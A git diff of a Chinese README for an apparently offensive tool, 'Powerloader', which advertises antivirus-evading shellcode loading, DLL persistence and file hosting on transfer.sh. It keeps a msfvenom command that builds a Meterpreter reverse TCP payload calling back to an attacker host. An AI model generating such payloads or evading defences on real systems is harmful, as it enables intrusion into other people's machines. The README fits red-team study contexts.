@@ -37,12 +37,12 @@
 
 
 
-|      功能      |                 描述                  |
-| :------------: | :-----------------------------------: |
-|  1.免杀加载器  |    拥有十种以上的shellcode加载方式    |
-| 2.文件格式转换 |      Windows中文件格式之间的转换      |
-|   3.权限维持   | 生成代理劫持的Dll，用于持久化渗透测试 |
-|   4.文件捆绑   |     1.捆绑文件异步执行2.上传文件      |
+|       功能       |                描述                |
+| :--------------: | :--------------------------------: |
+|   1.免杀加载器   |  拥有十种以上的shellcode加载方式   |
+|  2.文件格式转换  |    Windows中文件格式之间的转换     |
+|    3.权限维持    |    动态生成Dll，入口点是DllMain    |
+| 4.自动化文件托管 | 将文件托管到：https://transfer.sh/ |
 
 
 
@@ -54,24 +54,9 @@
 
 1.Mingw64(C/C++)的编程环境：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z
 
-将bin目录添加至环境变 量即可
+解压完以后，将bin目录添加至环境变 量即可
 
-2.Golang编程环境：https://go.dev/dl/go1.19.4.windows-amd64.msi
-
-3.Nim编程环境：
-
-Nim下载：https://nim-lang.org/install.html
-
-将bin目录添加至环境变量
-
-您还需要下载Winim：https://github.com/khchen/winim
-
-```
-cd winim-master
-nimble install
-```
-
-如果您在windows中安装了Git，就可以这样使用：
+使用Git下载项目
 
 ```
 git clone https://github.com/INotGreen/GlllPowerloader.git
@@ -92,19 +77,7 @@ Metasploit:
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
 ```
 
-
-
 ## 0x03.Automation_loader
-
-
-
-## 0x04.文件格式转换
-
-
-
-## 0x06.文件托管
-
-将文件上传到https://transfer.sh/
 
 
 
@@ -112,7 +85,9 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 [+] 2022年12.21，Powerloader发布
 
-[+]2023 年11.15-19，删除冗余的功能，优化代码
+[+]2023 年11.15-19， 删除冗余的功能，优化代码（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）
+
+免杀加载器正在更新中。。。
 
 
 # 5.免责声明
@@ -124,9 +99,3 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 在编写Powerloader时学习了很多前辈的项目，在此我非常感谢他们
 
 关于C/C++的加载器 ，我参考了它的部分代码和框架格式，这非常有意义：https://github.com/icyguider/Shhhloader
-
-还有Nim惊人的项目：https://github.com/byt3bl33d3r/OffensiveNim
-
-感谢：https://github.com/danielbohannon/Invoke-DOSfuscation
-
-https://github.com/peewpw/Invoke-PSImage
